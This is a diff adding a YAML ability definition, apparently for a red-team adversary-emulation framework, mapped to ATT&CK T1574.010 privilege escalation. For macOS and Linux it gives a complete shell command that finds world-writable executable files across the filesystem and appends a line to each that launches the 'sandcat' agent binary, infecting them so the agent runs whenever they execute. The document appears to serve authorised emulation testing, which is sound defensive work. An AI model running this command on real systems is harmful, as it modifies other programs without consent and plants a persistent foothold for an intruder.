@@ -1,0 +1,20 @@
+- id: 10681f2f-be03-44af-858d-f2b0812df185
+  name: Weak executable files
+  description: Locate and infect files with weak but executable perms
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1574.010
+    name: "Hijack Execution Flow: Services File Permissions Weakness"
+  platforms:
+    darwin:
+      sh:
+        command: |
+          find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-darwin && sandcat.go-darwin" >> "{}"; ls "{}" ' \; | echo "complete"
+        payloads:
+        - sandcat.go
+    linux:
+      sh:
+        command: |
+          find / -type f -size -500k -maxdepth 5 -perm -333 2>/dev/null -exec sh -c 'grep -qF "54NDC47_SCRIPT" "{}" || echo "#54NDC47_SCRIPT\n" "chmod +x sandcat.go-linux && sandcat.go-linux" >> "{}"; ls "{}" ' \; | echo "complete"
+        payloads:
+        - sandcat.go
